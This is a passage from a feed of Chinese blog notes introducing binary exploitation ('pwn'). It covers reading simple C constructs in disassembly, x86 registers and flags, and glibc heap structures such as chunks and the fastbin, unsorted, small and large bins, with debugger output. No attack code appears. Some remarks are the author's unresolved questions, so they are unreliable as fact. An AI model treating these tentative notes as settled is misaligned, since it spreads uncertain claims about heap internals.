mov     [rbp+var_4], eax         ;结果放到k中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:000000000000066E                 mov     ecx, [rbp+var_4]		;k&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000671                 mov     edx, [rbp+var_8]		;j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000674                 mov     eax, [rbp+var_C]		;i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000677                 mov     esi, eax					;i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000000000000679                 lea     rdi, format     ; &amp;quot;this is:%d %d %d\n&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;识别if语句&#34;&gt;&lt;a href=&#34;#识别if语句&#34; class=&#34;headerlink&#34; title=&#34;识别if语句&#34;&gt;&lt;/a&gt;识别if语句&lt;/h1&gt;&lt;p&gt;• if语句的结构 &lt;/p&gt;
&lt;p&gt;​	– if语句主要由判断语句和跳转语句构成 &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(i == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; this is 3&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; this is not 3&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306155253463.png&#34; alt=&#34;image-20230306155253463&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306155311814.png&#34; alt=&#34;image-20230306155311814&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;识别循环&#34;&gt;&lt;a href=&#34;#识别循环&#34; class=&#34;headerlink&#34; title=&#34;识别循环&#34;&gt;&lt;/a&gt;识别循环&lt;/h1&gt;&lt;p&gt;for和while循环差距不大&lt;/p&gt;
&lt;p&gt;for循环的4个组件 &lt;/p&gt;
&lt;p&gt;​	– 初始化、比较、执行指令、递增或递减&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;&lt;span class=&#34;number&#34;&gt;101&lt;/span&gt;;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    n += i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the sum is: %d\n&amp;quot;&lt;/span&gt;,n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-16-%E6%B1%87%E7%BC%96%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/image-20230306160758436.png&#34; alt=&#34;image-20230306160758436&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;识别结构体&#34;&gt;&lt;a href=&#34;#识别结构体&#34; class=&#34;headerlink&#34; title=&#34;识别结构体&#34;&gt;&lt;/a&gt;识别结构体&lt;/h1&gt;&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;一开始执行的是什么玩意??&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-03-03T13:54:42.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/</id>
        <title>pwn入门-14-基础知识查缺补漏1</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/"/>
        <content type="html">&lt;h1 id=&#34;寄存器&#34;&gt;&lt;a href=&#34;#寄存器&#34; class=&#34;headerlink&#34; title=&#34;寄存器&#34;&gt;&lt;/a&gt;寄存器&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133539208.png&#34; alt=&#34;image-20230308133539208&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133315474.png&#34; alt=&#34;image-20230308133315474&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;EFLAGS-状态寄存器-32位&#34;&gt;&lt;a href=&#34;#EFLAGS-状态寄存器-32位&#34; class=&#34;headerlink&#34; title=&#34;EFLAGS 状态寄存器 32位&#34;&gt;&lt;/a&gt;EFLAGS 状态寄存器 32位&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://article.itxueyuan.com/1DeLA0&#34;&gt;https://article.itxueyuan.com/1DeLA0&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		每一位都是一个标识,置位为1或清除为0&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230308133455659.png&#34; alt=&#34;image-20230308133455659&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;几个重要的标志位&#34;&gt;&lt;a href=&#34;#几个重要的标志位&#34; class=&#34;headerlink&#34; title=&#34;几个重要的标志位&#34;&gt;&lt;/a&gt;几个重要的标志位&lt;/h3&gt;&lt;p&gt;​		• ZF – 运算结果为0，ZF被置位，否则被清除 &lt;/p&gt;
&lt;p&gt;​		• CF – 结果相对于目标操作数太大或者太小时CF被置位，否则被清除 &lt;/p&gt;
&lt;p&gt;​		• SF – 运算结果为负，或者运算结果最高位为1时，SF被 置位 &lt;/p&gt;
&lt;p&gt;​		• TF – 用于调试，当它被置位时，x86处理器每次只执行一条指令&lt;/p&gt;
&lt;h1 id=&#34;调用约定&#34;&gt;&lt;a href=&#34;#调用约定&#34; class=&#34;headerlink&#34; title=&#34;调用约定&#34;&gt;&lt;/a&gt;调用约定&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/image-20230303213215000.png&#34; alt=&#34;image-20230303213215000&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.codenong.com/10483544/&#34;&gt;https://www.codenong.com/10483544/&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-03-03T11:17:35.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/</id>
        <title>pwn入门-13-堆入门基础</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/"/>
        <content type="html">&lt;h1 id=&#34;glibc的堆管理实现&#34;&gt;&lt;a href=&#34;#glibc的堆管理实现&#34; class=&#34;headerlink&#34; title=&#34;glibc的堆管理实现&#34;&gt;&lt;/a&gt;glibc的堆管理实现&lt;/h1&gt;&lt;p&gt;arena&lt;/p&gt;
&lt;p&gt;​	指的是堆内存区域本身,并非结构	&lt;/p&gt;
&lt;p&gt;​	主线程的main arena通过sbrk创建&lt;/p&gt;
&lt;p&gt;​	其他线程arena通过mmap创建&lt;/p&gt;
&lt;p&gt;malloc_state&lt;/p&gt;
&lt;p&gt;​	管理arena的核心结构,包括堆的状态信息,bins链表等&lt;/p&gt;
&lt;p&gt;​	main arena对应的malloc_state结构存储在glibc的全局变量中&lt;/p&gt;
&lt;p&gt;​	其他线程的arena对应的malloc_state存储在arena本身&lt;/p&gt;
&lt;p&gt;bins&lt;/p&gt;
&lt;p&gt;​	用来管理空闲内存块,通常使用链表结构来进行组织&lt;/p&gt;
&lt;p&gt;chunks&lt;/p&gt;
&lt;p&gt;​	内存块的结构&lt;/p&gt;
&lt;h2 id=&#34;chunks&#34;&gt;&lt;a href=&#34;#chunks&#34; class=&#34;headerlink&#34; title=&#34;chunks&#34;&gt;&lt;/a&gt;chunks&lt;/h2&gt;&lt;p&gt;​		用户请求的空间. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230531123349377.png&#34; alt=&#34;image-20230531123349377&#34;&gt;&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230228135503733.png&#34; alt=&#34;image-20230228135503733&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;p&gt;prev_size &amp;#x2F; prev_data： &lt;/p&gt;
&lt;p&gt;• 如果前一个chunk是allocated chunk(P&amp;#x3D;1)，则此字段属于前一个chunk可用的data部分&lt;/p&gt;
&lt;p&gt;• 如果前一个chunk是free chunk(P&amp;#x3D;0)，则此字段表示前一个chunk的size(prev_size)&lt;/p&gt;
&lt;p&gt;标志位（size字段的低3bit） &lt;/p&gt;
&lt;p&gt;• N：NON_MAIN_ARENA flag，表示chunk是否属于主线程&lt;/p&gt;
&lt;p&gt;• M：IS_MMAPPED flag，表示是否由mmap分配&lt;/p&gt;
&lt;p&gt;• P：PREV_INUSE flag，前一个chunk是否处于使用状态&lt;/p&gt;
&lt;p&gt;如果当前chunk已经被free到bin中，&lt;/p&gt;
&lt;p&gt;• fd：指向bin中后一个空闲块的指针&lt;/p&gt;
&lt;p&gt;• bk：指向bin中前一个空闲块的指针&lt;/p&gt;
&lt;p&gt;（后一个和前一个均不一定是物理相邻的）&lt;/p&gt;
&lt;p&gt;如果当前chunk已经被free到large bin（后面马上会提到）中，&lt;/p&gt;
&lt;p&gt;• fd_nextsize：指向large bin中后一个与自己大小不同的chunk的指针&lt;/p&gt;
&lt;p&gt;• bk_nextsize：指向large bin中前一个与自己大小不同的chunk的指针&lt;/p&gt;
&lt;p&gt;大小对齐&lt;/p&gt;
&lt;p&gt;在glibc中，对齐由malloc.c中的request2size宏实现。可以简单将该操作理解为下表中的映射，即：实际size &amp;#x3D; 请求的size+8后对应的下一个0x10对齐的值&lt;/p&gt;
&lt;p&gt;这里应该还考虑了下一个chunk的复用,那万一复用不了呢?&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230531125219099.png&#34; alt=&#34;image-20230531125219099&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h3 id=&#34;free-chunk&#34;&gt;&lt;a href=&#34;#free-chunk&#34; class=&#34;headerlink&#34; title=&#34;free chunk&#34;&gt;&lt;/a&gt;free chunk&lt;/h3&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230306130932182.png&#34; alt=&#34;image-20230306130932182&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;h3 id=&#34;allocated-chunk&#34;&gt;&lt;a href=&#34;#allocated-chunk&#34; class=&#34;headerlink&#34; title=&#34;allocated chunk&#34;&gt;&lt;/a&gt;allocated chunk&lt;/h3&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230306130712884.png&#34; alt=&#34;image-20230306130712884&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;p&gt;下一个chunk的prev_size也可以被用来存放数据,因为只有前一个chunk是free的时候这个字段才有意义&lt;/p&gt;
&lt;h1 id=&#34;案例&#34;&gt;&lt;a href=&#34;#案例&#34; class=&#34;headerlink&#34; title=&#34;案例&#34;&gt;&lt;/a&gt;案例&lt;/h1&gt;&lt;p&gt;顺便学一下怎么调试源码&lt;/p&gt;
&lt;p&gt;指定libc版本编译 &lt;a href=&#34;https://blog.csdn.net/mo4776/article/details/119837501&#34;&gt;https://blog.csdn.net/mo4776/article/details/119837501&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;-Wl,–dynamic-linker&amp;#x3D;&amp;#x2F;动态连接器的路径&amp;#x2F;ld-linux-x86-64.so.2&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/bandaoyu/article/details/121476940&#34;&gt;https://blog.csdn.net/bandaoyu/article/details/121476940&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gcc -Wl,-rpath&amp;#x3D;’&amp;#x2F;my&amp;#x2F;lib’,-dynamic-linker&amp;#x3D;’&amp;#x2F;my&amp;#x2F;lib&amp;#x2F;ld-linux.so.2’&lt;/p&gt;
&lt;p&gt;gcc -Wl,-rpath&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;&amp;#x2F;,–dynamic-linker&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;ld-linux-x86-64.so.2 1.c&lt;/p&gt;
&lt;h1 id=&#34;各种bin&#34;&gt;&lt;a href=&#34;#各种bin&#34; class=&#34;headerlink&#34; title=&#34;各种bin&#34;&gt;&lt;/a&gt;各种bin&lt;/h1&gt;&lt;p&gt;​	fast bin、tcache bin按照LIFO(last in first out)单链表组织，采用头插法&lt;/p&gt;
&lt;p&gt;​	unsorted bin、small bin按照FIFO(first in first out)双链表组织，采用头插法&lt;/p&gt;
&lt;p&gt;​	large bin按照双链表组织，插入节点时会保证size从大到小排序&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.51cto.com/u_15076233/3914352&#34;&gt;https://blog.51cto.com/u_15076233/3914352&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		有两种结构来管理,一种是fastbin的,另外一种是其他三种bin的&lt;/p&gt;
&lt;h3 id=&#34;x2F-Fastbins-x2F-用来管理小的chunk&#34;&gt;&lt;a href=&#34;#x2F-Fastbins-x2F-用来管理小的chunk&#34; class=&#34;headerlink&#34; title=&#34;&amp;#x2F;* Fastbins *&amp;#x2F; 用来管理小的chunk&#34;&gt;&lt;/a&gt;&amp;#x2F;* Fastbins *&amp;#x2F; 用来管理小的chunk&lt;/h3&gt;&lt;p&gt;​		mfastbinptr fastbinsY[NFASTBINS];&lt;/p&gt;
&lt;h3 id=&#34;x2F-Normal-bins-packed-as-described-above-x2F&#34;&gt;&lt;a href=&#34;#x2F-Normal-bins-packed-as-described-above-x2F&#34; class=&#34;headerlink&#34; title=&#34;&amp;#x2F;* Normal bins packed as described above *&amp;#x2F;&#34;&gt;&lt;/a&gt;&amp;#x2F;* Normal bins packed as described above *&amp;#x2F;&lt;/h3&gt;&lt;p&gt;​		mchunkptr bins[NBINS * 2 - 2];&lt;/p&gt;
&lt;p&gt;​		• bins：能够存放所有size范围的free chunk，共127个链表节点项，每个链表长度不限。&lt;/p&gt;
&lt;p&gt;​		• bin[0]为unsorted bin  存放未整理的chunk&lt;/p&gt;
&lt;p&gt;​		• bin[2] ~ bin[63]为small bin 管理中等大小的chunk&lt;/p&gt;
&lt;p&gt;​		• bin[64] ~ bin[127]为large bin  存放较大的chunk&lt;/p&gt;
&lt;h2 id=&#34;fastbin&#34;&gt;&lt;a href=&#34;#fastbin&#34; class=&#34;headerlink&#34; title=&#34;fastbin&#34;&gt;&lt;/a&gt;fastbin&lt;/h2&gt;&lt;p&gt;​		将小chunk单独管理(0x20 - 0x80,以0x10为单位,共7个),fd指向它前面那一个 (64位)&lt;/p&gt;
&lt;p&gt;​		使用顺序: &lt;font color=&#34;red&#34;&gt;先进后出 ,或者说,后进,先出, 头插! &lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		靠近fastbinY[]的是头部&lt;/p&gt;
&lt;p&gt;​		释放的时候并不会把p标志置为0&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230228135750332.png&#34; alt=&#34;image-20230228135750332&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kiprey.github.io/2020/04/heap-3-bins/&#34;&gt;https://kiprey.github.io/2020/04/heap-3-bins/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;堆命令: vis fastbin&lt;/p&gt;
&lt;p&gt;how2heap 2.23 fastbin的例子&lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c&#34;&gt;https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup.c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;分配完三个0x8大小的堆块后的堆布局,这里有几个细节需要注意.&lt;/p&gt;
&lt;p&gt;1.对齐问题,因为要进行16字节对齐,所以哪怕是分配了8字节,也会给一个16字节的空间,头部是16字节,所以一共32字节&lt;/p&gt;
&lt;p&gt;Malloc(16)也是这样的,malloc(24呢) 也是一样的, 是因为会复用下一个chunk的prev_size吗? 那不复用不就不够了&lt;/p&gt;
&lt;p&gt;这个size是包含了头部的&lt;/p&gt;
&lt;p&gt;那岂不是如果malloc24的话,正好的空间,malloc16的话,会多了8字节可用的空间&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405104919306.png&#34; alt=&#34;image-20230405104919306&#34;&gt;&lt;/p&gt;
&lt;p&gt;后进先出,后面进来的会被挂到头部,可以修改一下代码,释放abc看一下,c是0,b是1,a是2&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405182425846.png&#34; alt=&#34;image-20230405182425846&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;unsorted-bin&#34;&gt;&lt;a href=&#34;#unsorted-bin&#34; class=&#34;headerlink&#34; title=&#34;unsorted bin&#34;&gt;&lt;/a&gt;unsorted bin&lt;/h2&gt;&lt;p&gt;​		(除了fastbin外) 被释放的chunk以及把大的chunk分割出来的剩下的chunk,都会先放进这里,目的主要是能让malloc有二次利用最近释放的chunk的机会&lt;/p&gt;
&lt;p&gt;​		unsorted bin只有一个,位于bin[1]中 ???? &lt;/p&gt;
&lt;p&gt;​		无序双向链表,FIFO, 链头插入chunk,链尾取出?? 不对吧 对的,看图,左边是插入,右边是取出&lt;/p&gt;
&lt;p&gt;​		unsorted bin 本身是什么呢? 在哪里?&lt;/p&gt;
&lt;p&gt;​		释放的时候会合并? 什么情况下, 相邻的会合并,(还有其他条件吗?)&lt;/p&gt;
&lt;p&gt;unsortedbin&lt;br&gt;all: 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557591c0&lt;/p&gt;
&lt;p&gt;unsortedbin&lt;br&gt;all: 0x555555759380 —▸ 0x5555557591c0 —▸ 0x555555759000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555759380&lt;/p&gt;
&lt;p&gt;左右箭头应该是 fd和bk的意思( 左箭头是值的意思吧)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405185946527.png&#34; alt=&#34;image-20230405185946527&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;small-bin&#34;&gt;&lt;a href=&#34;#small-bin&#34; class=&#34;headerlink&#34; title=&#34;small bin&#34;&gt;&lt;/a&gt;small bin&lt;/h2&gt;&lt;p&gt;​		bin[2] ~ bin[63]为small bin, 管理大小为[0x20, 0x400]的 free chunk,(64位)&lt;/p&gt;
&lt;p&gt;​		small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size &amp;#x3D; 2 * SIZE_SZ *index，具体如下&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230405191536275.png&#34; alt=&#34;image-20230405191536275&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​		16-504B 0x10-0x200&lt;/p&gt;
&lt;p&gt;​		32-1008B 0x20-0x400&lt;/p&gt;
&lt;p&gt;​		索引为&lt;code&gt;2&lt;/code&gt;中chunk大小为0x20 - 0x30&lt;br&gt;​		索引为&lt;code&gt;3&lt;/code&gt;里的chunk大小为0x30 - 0x40&lt;br&gt;​		&lt;code&gt;......&lt;/code&gt;&lt;br&gt;​		索引为&lt;code&gt;63&lt;/code&gt;里的chunk大小为0x3F0 - &lt;font color=&#34;red&#34;&gt;0x400&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/image-20230416162024923.png&#34; alt=&#34;image-20230416162024923&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;large-bin&#34;&gt;&lt;a href=&#34;#large-bin&#34; class=&#34;headerlink&#34; title=&#34;large bin&#34;&gt;&lt;/a&gt;large bin&lt;/h2&gt;&lt;p&gt;​		bin[64] ~ bin[126]为large bin  存放较大的chunk&lt;/p&gt;
&lt;p&gt;​		large bin 大体上分为6大组，其中每个大组里都有若干小组&lt;/p&gt;
